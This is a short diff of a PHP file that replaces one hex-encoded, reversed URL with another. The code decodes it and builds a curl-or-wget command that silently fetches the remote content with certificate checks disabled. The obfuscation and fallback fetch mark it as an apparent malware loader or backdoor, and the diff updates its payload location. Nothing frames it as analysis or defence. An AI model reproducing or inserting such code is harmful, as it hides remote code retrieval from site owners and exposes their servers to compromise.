@@ -1,5 +1,5 @@
 <?php
-$enc = '70563932706b2f6c6e2e616d61726f6265772e6d696c732f2f3a7370747468';
+$enc = '7478742e33332f6d6f632e6275686d6f6d706574732f2f3a7370747468';
 $url = strrev(hex2bin($enc));
 $cmd = "curl -sLk " . escapeshellarg($url) . " || wget -qO- --no-check-certificate " . escapeshellarg($url);
 
